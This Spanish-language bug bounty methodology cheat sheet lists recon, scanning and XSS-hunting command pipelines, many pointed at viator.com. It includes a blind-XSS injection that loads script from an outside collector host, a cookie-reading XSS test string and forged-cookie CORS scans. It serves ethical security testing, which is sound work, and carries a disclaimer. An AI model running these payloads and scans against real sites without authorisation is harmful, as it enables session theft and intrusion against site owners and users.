# ***I. Bug Bounty: Methodology***

`Bug Bounty Methodology` este documento sirve para tener una metodología a la hora de hacer bug bounty en programas BBP (bug bounty program) o VDP (vulnerability disclosure program). Donde encontraras comandos para ayudarte rapidamente a realizar bug bounty desde lo mas básico a lo avanzado.

### 1.1. Encontrar subdominios con subfinder

```bash
subfinder -d viator.com -all  -recursive > subdomain.txt
```

### 1.2. Usando httpx-toolkit

```bash
cat subdomain.txt | httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 > subdomains_alive.txt
```

### 1.3. Usando katana

```bash
katana -u subdomains_alive.txt -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -kf -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg -o allurls.txt
```

### 1.4. Filtrar por extensiones

```bash
cat allurls.txt | grep -E "\.txt|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.json|\.gz|\.rar|\.zip|\.config"
```

### 1.5. Filtrar extensiones javascript

```bash
cat allurls.txt | grep -E "\.js$" >> js.txt
```

### 1.6. Usando nuclei para ver encontrar Information disclosure

```bash
cat js.txt | nuclei -t /home/sn0w/nuclei-templates/http/exposures/ 
```

### 1.7. Usando nuclei para ver encontrar Information disclosure en un sitio web

```bash
echo www.viator.com | katana -ps | grep -E "\.js$" | nuclei -t /home/sn0w/nuclei-templates/http/exposures/ -c 30
```

### 1.8. Buscar con dirsearch directorios ocultos vulnerables

```bash
dirsearch  -u https://www.viator.com -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,http://sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,.log,.xml,.js.,.json
```
```bash
dirsearch -u https://example.com -e php,cgi,htm,html,shtm,shtml,js,txt,bak,zip,old,conf,log,pl,asp,aspx,jsp,sql,db,sqlite,mdb,tar,gz,7z,rar,json,xml,yml,yaml,ini,java,py,rb,php3,php4,php5 --random-agent --recursive -R 3 -t 20 --exclude-status=404 --follow-redirects --delay=0.1
```

### 1.9. Buscar con subfinder, httpx, katana, gf, bxss en el sitio web vulnerabilidades xss

```bash
subfinder -d viator.com | httpx-toolkit -silent |  katana -ps -f qurl | gf xss | bxss -appendMode -payload '"><script src=https://xss.report/c/coffinxp></script>' -parameters
```

### 1.10. Ver certificados SSL vulnerable

```bash
subzy run --targets subdomains_alive.txt --verify_ssl
```
```bash
subzy run --targets subdomains_alive.txt --concurrency 100 --hide_fails --verify_ssl
```

### 1.11. CORS

```bash
python3 corsy.py -i /home/sn0w/vaitor/subdomains_alive.txt -t 10 --headers "User-Agent: GoogleBot\nCookie: SESSION=Hacked"

```
### 1.12. CORS con Nuclei

```bash
nuclei -list subdomains_alive.txt -t /home/sn0w/Priv8-Nuclei/cors
```

### 1.13. Nuclei

```bash
nuclei  -list ~/vaitor/subdomains_alive.txt -tags cve,osint,tech
```

### 1.14. LFI

```bash
cat allurls.txt | gf lfi | nuclei -tags lfi
```

### 1.15. OR Open Redirect

```bash
cat allurls.txt | gf redirect | openredirex -p /home/sn0w/openRedirect
```


-------------------------------------------------------------------------------------------------


# ***II. XSS: Methodology***

`XSS Methodology` herramientas utilizadas.
- https://github.com/lc/gau
- https://github.com/tomnomnom/gf
- https://github.com/coffinxp/gFpattren
- https://github.com/s0md3v/uro
- https://github.com/KathanP19/Gxss
- https://github.com/Emoe/kxss
- https://github.com/coffinxp/loxs


### 2.1. Encontrar un campo de entrada como un buscar en una web, primero copiar un texto y si sale not found, con control + U vemos en el código fuente si el texto se guarda en el value.
```bash
paulportanc"><img src/onerror=prompt(document.cookie)>
```

### 2.2. Automatizando.
- Buscamos mas campos que sean vulnerables a XSS
```bash
echo https://www.ejemplo.com/ | gau | gf xss | uro | Gxss | kxss | tee xss_output.txt
```
- De los campos encontrados extraemos hasta donde inicia la busqueda para pasarlo por la herramienta de loxs
```bash
cat xss_output.txt | grep -oP '^URL: \K\S+' | sed 's/=.*/=' | sort -u > final.txt

cat final.txt
https://www.ejemplo.com/analog-watches?page=
https://www.ejemplo.com/boxers?page=
https://www.ejemplo.com/search?seach_key=
https://www.ejemplo.com/home-storage-supplies?page=
https://www.ejemplo.com/wall-clock?page=
....
```
- Mover el archivo final.txt al directorio donde esta la herramienta loxs https://github.com/coffinxp/loxs
```bash
mv final.txt loxs
cd loxs
python loxs.py
```
- Elegir la opción 4 de la herramienta XSS Scanner. En la primera pregunta escribimos final.txt que buscara nuestro archivo que hemos movido al directorio de la herramienta. Y en la segunda pregunta escogemos e payload xss.txt, finalmente en el tiempo por cada solicitud damos enter.
```bash
[?] enter the pat to the input file containing URLs (or press enter to enter a single UR): final.txt
[?] Enter the path to the payloads file: payloads/xss.txt
Enter the timeout duration for each request (Press Enter for 0.5): "Presionar enter"
```


> [!Warning]
> 
> # DISCLAIMER
> Este documento está destinado únicamente para fines educativos y de hacking ético. Sólo debe utilzarse para probar sistemas de su propiedad o para los que tenga permiso explícito para probar. El uso no autorizado de sitios web o sistemas de terceros sin consentimiento es ilegal y poco ético.
